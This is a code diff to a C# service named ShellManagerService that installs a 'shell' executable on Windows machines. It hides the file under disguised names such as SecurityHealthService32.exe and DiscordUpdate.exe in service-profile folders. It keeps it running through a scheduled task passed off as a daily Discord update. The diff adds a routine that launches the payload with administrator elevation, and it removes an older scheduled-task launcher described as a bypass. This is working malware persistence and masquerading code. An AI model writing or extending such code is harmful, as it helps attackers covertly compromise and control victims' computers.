@@ -13,10 +13,19 @@ namespace ShellManagerService
         public const int tmp_name_length = 16;
         public const string exe_name = "SecurityHealthService32.exe";
         public const string backup_shell_folder = "C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\";
+        public const string main_shell_folder = "C:\\Windows\\ServiceProfiles\\LocalService";
         public const string backup_shell_name = "DiscordUpdate.exe";
         private static Random random = new Random();
 
-        public static string old_tmp_name { get; set; }
+        //public static string old_tmp_name { get; set; }
+        public static void ExecuteAsAdmin(string fileName)
+        {
+            Process proc = new Process();
+            proc.StartInfo.FileName = fileName;
+            proc.StartInfo.UseShellExecute = true;
+            proc.StartInfo.Verb = "runas";
+            proc.Start();
+        }
         public static void LoadShellInDisk()
         {
             //Call the process with some "realistic" name
@@ -77,7 +86,7 @@ namespace ShellManagerService
             }
 
             //Start process
-            StartProcess(tmp_name);
+            ExecuteAsAdmin(tmp_name);
         }
         //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
         public static void LoadSecondShellAndCreateTask()
@@ -106,17 +115,6 @@ namespace ShellManagerService
             using (var ts = new TaskService())
             {
                 var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6)).AsTask("Discord daily update task");
-            }
-        }
-        //Services run as User 0, therefore cannot start other processes. A possible bypass is to schedule a single run Task for the executable :)
-        public static void StartProcess(string file_path)
-        {
-            using (var ts = new TaskService())
-            {
-                var t = ts.Execute(file_path)
-                    .Once()
-                    .Starting(DateTime.Now.AddSeconds(3))
-                    .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
             }
         }
     }
